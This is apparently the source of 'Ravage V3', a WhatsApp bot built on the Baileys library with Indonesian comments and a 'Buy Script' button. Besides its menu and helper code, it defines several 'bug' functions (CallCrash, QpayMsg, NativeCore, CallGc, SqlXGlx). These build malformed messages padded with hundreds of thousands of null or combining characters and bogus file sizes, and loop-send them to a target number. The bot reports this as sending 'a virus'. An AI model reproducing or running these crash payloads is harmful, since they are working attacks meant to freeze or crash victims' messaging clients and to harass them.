/*
* KALO GABISA BUAT SC JANGAN NGAKU² LU YANG BIKIN YA DEK. 

* Mau rinem? 

* Minimal kasih credits
© Daffa Developer
*/

require('./settings');
const fs = require('fs');
const { modul } = require('./module')
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const yts = require('yt-search');
const { Client } = require('ssh2');
const moment = require("moment-timezone");
const speed = require('performance-now');
const JsConfuser = require('js-confuser');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = dafa = async (dafa, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? dafa.user.id.split(":")[0] || dafa.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database And Lain"
const botNumber = await dafa.decodeJid(dafa.user.id);
const isBot = botNumber.includes(senderNumber)
const ownerbot = JSON.parse(fs.readFileSync("./lib/Database/owner.json"))
const isOwner = ownerbot.includes(sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const isPc = from.endsWith('@s.whatsapp.net')

// function Group
const groupMetadata = isGroup ? await dafa.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.daffaganteng : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')


        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom,
sleep } = require('./lib/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

const DaffaDevStickSc = () => {
        let DaffaDevStikRep = fs.readFileSync('./sticker-replydaf-sc/sc.webp')
        dafa.sendMessage(from, { sticker: DaffaDevStikRep }, { quoted: m })
        }  

const replydaf = (teks) => {
    dafa.sendMessage(m.chat, { 
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: global.title,
                previewType: "PHOTO",
                thumbnailUrl: global.image.Reply,
                thumbnail: `https://i.top4top.io/p_3335svahd1.jpg`,
                sourceUrl: global.website
            }
        }
    }, { quoted: m });
}      


// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
}

//==========================================//
const { os, baileys, child_process, crypto, cookie,  fetch, process, ms, speed, syntaxerror, nodecron } = modul
//==========================================//

//==========================================//   
const userSessions = {};
//==========================================//    
const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: `私はあなたが好き`,
footerText: ``,
buttons: [
{ buttonId: "\u0000".repeat(749999), buttonText: { displayText: "DapzInHere" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: dafa.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};

//======================================//
async function SqlXGlx(target) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "軎�".repeat(25);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "P",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: 'galaxy_message',
                    paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
},
                ],
              },
            },
          },
        },
      };

      await dafa.relayMessage(target, message, {
        participant: { jid: target },
      });
    }

//=======================================//
async function CallCrash(target) {
  let OverCall = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "👑",
            text: "𝐑𝐚𝐯𝐚𝐠𝐞 𝐒𝐢𝐱𝐂𝐨𝐫𝐞💥" + "᭄".repeat(9741),
            description: "💌",
            footer: "T-Яyuichi",
          },
             nativeFlowMessage: {
              buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  };
await dafa.relayMessage(target, OverCall, {
    participant: { jid: target },
  });
  console.log("Successfully Send CallCrash To Target🎯")
}

//=======================================//
async function QpayMsg(target) {
    const etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "974197419741",
                                pageCount: "974197419741",
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: "𝐓𝐚𝐦𝐚𝐂𝐫𝐚𝐬𝐡~𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭 :v",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true,
                            },
                            hasMediaAttachment: true,
                            jpegThumbnail: ryclol
                        },
                        orderMessage: {
                                orderId: "CRASHCODE9471",
                                thumbnail: ryclol,
                                itemCount: 999999999,
                                status: "INQUIRY",
                                surface: "CATALOG",
                                message:
                                    "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟" +
                                    "᭄".repeat(103000) +
                                    "ꦾ".repeat(70000),
                                orderTitle: "INFINITY",
                                sellerJid: "13135550002@s.whatsapp.net",
                                token:
                                    "AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
                                totalAmount1000: "100000019492000",
                                totalCurrencyCode: "IDR",
                                messageVersion: 2,
                            },
                        contextInfo: {
                            stanzaId: dafa.generateMessageTag(),
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target, "13135550002@s.whatsapp.net"],
                            quotedMessage: {
                                buttonsMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                        fileLength: "9999999999999",
                                        pageCount: 3567587327,
                                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                        fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
                                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mediaKeyTimestamp: "1735456100",
                                        contactVcard: true,
                                        caption: "Wanna Die ? Huh !"
                                    },
                                    contentText: "I Wanna Die With You \"😮‍💨\"",
                                    footerText: "© T-Яyuichi",
                                    buttons: [
                                        {
                                            buttonId: "\u0000".repeat(900000),
                                            buttonText: {
                                                displayText: "⩟⬦𪲁 𝐓͜͢𝐀͠𝐌̋͡𝐀̸̷̷̷͡𝐗͜͢𝐒 -"
                                            },
                                            type: 1
                                        }
                                    ],
                                    headerType: 3
                                }
                            }
                        }
                    }
                }
            }
        }),
        {
            userJid: target,
            quoted: cursor
        }
    );

    await dafa.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id
    });
}

//=======================================//
async function NativeCore(target) {
  let NativeCore = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "👑",
            text: "𝐑𝐚𝐯𝐚𝐠𝐞 𝐒𝐢𝐱𝐂𝐨𝐫𝐞💥" + "᭄".repeat(9741),
            description: "💌",
            footer: "T-Яyuichi",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "view_product", buttonParamsJson: "" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "payment_info", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  };
  await dafa.relayMessage(target, NativeCore, {
    participant: { jid: target },
  });
  console.log("Successfully Send NativeCore To Target🎯")
}

//=======================================//
async function CallGc(target) {
await dafa.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: "𝗗𝗮𝗳𝗳𝗮 𝗧𝗮𝗺𝘃𝗮𝗻👊" + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 'youtube.com/@stokrapip',
                        nativeFlowMessage: {
                        buttons: [
                        {
                        name: "single_select",
                        buttonParamsJson: "",
                        },
                        {
                        name: "call_permission_request",
                        buttonParamsJson: "",
                        },
                        {
                        name: "mpm",
                        buttonParamsJson: "",
                        },
                        {
                        name: "mpm",
                        buttonParamsJson: "",
                        },
                        {
                        name: "mpm",
                        buttonParamsJson: "",
                        },
                        {
                        name: "mpm",
                        buttonParamsJson: "",
                        },
                        ],
                      },
                    }
                }
            }
        }, {});
      }

//=======================================//
async function Buk1000(target) {
    for (let i = 0; i <= 20; i++) {
    await SqlXGlx(target);
    await CallCrash(target);
    }
}

//=======================================//
async function Buk2000(target) {
    for (let i = 0; i <= 20; i++) {
    await NativeCore(target);
    await CallCrash(target);
    }
}

//=======================================//
async function Buk3000(target) {
    for (let i = 0; i <= 20; i++) {
    await CallCrash(target);
    await NativeCore(target);
    await QpayMsg(target);
    }
}

//=======================================//
async function Buk4000(target) {
    for (let i = 0; i <= 20; i++) {
    await CallGc(target);
    await CallCrash(target);
    }
}

async function Buk5000(target) {
    for (let i = 0; i <= 20; i++) {
    await CallGc(target);
    await CallCrash(target);
    await NativeCore(target);
    await QpayMsg(target);
    }
}
// AKHIR FUNC BUG //
//=======================================//
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await dafa.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await dafa.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await dafa.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await dafa.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}  

async function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
//==========================================//

// Done Ress //
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `[ ꪉ ] 𝐁𝐨𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐝𝐬 𝐀 𝐕𝐢𝐫𝐮𝐬 𝐓𝐨 ${pepec} 🎯
[ ꪉ ] 𝐕𝐢𝐫𝐮𝐬 : _*${command}*_
[ ꪉ ] 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝟏𝟓 𝐌𝐢𝐧𝐮𝐭𝐞𝐬❕`

  let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "Back To Menu" } }, 
         { buttonId: ".scriptravage", buttonText: { displayText: "Buy Script" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "𝐑𝐚𝐯𝐚𝐠𝐞𝐗𝐅𝐥𝐨𝐨𝐝𝐬💥"
            }
        },
        footer: "© ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await dafa.sendMessage(m.chat, buttonMessage, { quoted: cursor });
}

// Random Emoji //       
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Bot //

const thumb = fs.readFileSync('./menu.png');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('DaffaDev.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Halo Kak @${pushname}, Apakah kakak sedang mencari ${prefix+mean}?\n▢ Nama menu : ${prefix+mean}`
let buttons = [
        { buttonId: `.${mean}`, buttonText: { displayText: `${mean}` } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: response,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎"
            }
        },
        footer: "© Ravage V3",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await dafa.sendMessage(m.chat, buttonMessage, { quoted: m })
}}

const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "120363311920743499@newsletter",
newsletterName: `ᴄʜᴀɴɴᴇʟ ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: dafa.decodeJid(dafa.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `ʙʏ ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await dafa.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

const daf = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
    },
    message: {
        productMessage: {
            product: {
                title: `𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎`,
                description: `${pushname} order`,
                currencyCode: "IDR",
                priceAmount1000: "1000000000000",
                retailerId: `ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ`,
                productImageCount: 1,
                productImage: {
                    mimetype: "image/jpeg",
                    jpegThumbnail: await getBuffer("https://i.top4top.io/p_3335svahd1.jpg") // Ambil gambar sebagai buffer
                }
            },
            businessOwnerJid: `0@s.whatsapp.net`,
        },
    },
};

const ftoko = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        productMessage: {
          product: {
            title: `𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎`,
            description: `${pushname} order`,
            currencyCode: "IDR",
            priceAmount1000: "1000000000000",
            retailerId: `ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
const hw = {
  key: {
    participant: '180024284@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `©ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ`,
      jpegThumbnail: fs.readFileSync('./menu.png'), 
      thumbnailUrl: `https://i.top4top.io/p_3335svahd1.jpg`,
    }
  }, 
quoted: sound
} 
//=======≠======≠=≠≠==≠==============≠=====//
const DaffaReply = async (teks) => {
    await sleep(100);
    
    return dafa.sendMessage(
        m.chat,
        {
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    showAdAttribution: false,
                    renderLargerThumbnail: false,
                    title: `𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎︎`,
                    body: `ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ`,
                    previewType: "VIDEO",
                    thumbnail: thumb,
                    sourceUrl: `https://youtube.com/@daffa-dev`,
                    mediaUrl: `https://wa.me/6282321593192`
                }
            },
            text: teks
        },
        { quoted: m }
    );
};

//=======================================//
const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": fs.readFileSync('./menu.png'),
					"thumbnailUrl": `https://i.top4top.io/p_3335svahd1.jpg`,
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "Daffa Developer",
					"sellerJid": "18002428478@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}


    const isCreator = JSON.parse(fs.readFileSync('./lib/Database/owner.json'));

    const isAccDaffaDev = [botNumber, ...isCreator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);

const reply = (teks) => { 
dafa.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐂̴͢͠𝐫𝐚𝐬ͯ͢𝐡𝐞͢𝐫 𝐕͢𝟑.𝟎`,"body": `© ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ`, "previewType": "PHOTO","thumbnailUrl": `https://j.top4top.io/p_3340cuxis1.jpg`}}}, { quoted: hw})} 

const reaction = async (jidss, emoji) => {
dafa.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

switch (command) {
case "menu": case "xmenu": case "ravagemenu": {

   await dafa.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });
      
      const fs = require('fs'); // Untuk baca file
    


    const captionnya = `Hi I'm Ravage Whatsapp Bot Created By Daffa Dev

[ ♢ ] 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁
* Creator : 𝗗𝗮𝗳𝗳𝗮 𝗗𝗲𝘃
* Bot Name : Ravage
* Version : 𝟯.𝟬.𝟬
* Prefix : "."
* Type : 𝗖𝗮𝘀𝗲
[ ♢ ] 𝗕𝗼𝘁𝘇 𝗙𝗲𝗮𝘁𝘂𝗿𝗲
* Bugmenu『 sʜᴏᴡ ʙᴜɢᴍᴇɴᴜ 』
* Ownermenu 『 sʜᴏᴡ ᴏᴡɴᴇʀᴍᴇɴᴜ 』

[ ♢ ] 𝗙𝘂𝗻 𝗙𝗲𝗮𝘁𝘂𝗿𝗲
* Hidetag 𝗧𝗲𝗸𝘀
* Enchard 𝗥𝗲𝗽𝗹𝘆 𝗝𝘀
* Tourl 𝗥𝗲𝗽𝗹𝘆 𝗜𝗺𝗮𝗴𝗲
* Play 𝗧𝗶𝘁𝗹𝗲𝘀
* Pin 𝗧𝗶𝘁𝗹𝗲𝘀
* Rvo 𝗥𝗲𝗽𝗹𝘆 𝗜𝗺𝗮𝗴𝗲
* Produk 𝗦𝘁𝗼𝗿𝗲
* Spamtag 𝗧𝗮𝗴
`

let buttons = [
      { buttonId: ".daffaganteng", buttonText: { displayText: "Owner" } }, 
      { buttonId: ".thanksto", buttonText: { displayText: "Thanks To" } }
];

    let buttonMessage = {
        video: { url: `https://h.top4top.io/m_3332qwk1h1.mp4` },
	    gifPlayback: true,
	    caption: captionnya,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎`,
              body: `© ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ`,
             thumbnailUrl: `https://i.top4top.io/p_3335svahd1.jpg`,
            sourceUrl: `https://whatsapp.com/channel/0029Vaj0N1c2ZjCq1tOjgI0u`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
        footer: "© Ravage V3",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };

    await dafa.sendMessage(m.chat, buttonMessage, { quoted: PayX });       
     await dafa.sendMessage(m.chat, {audio: fs.readFileSync('./sound/menu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: ftoko})
                }
break

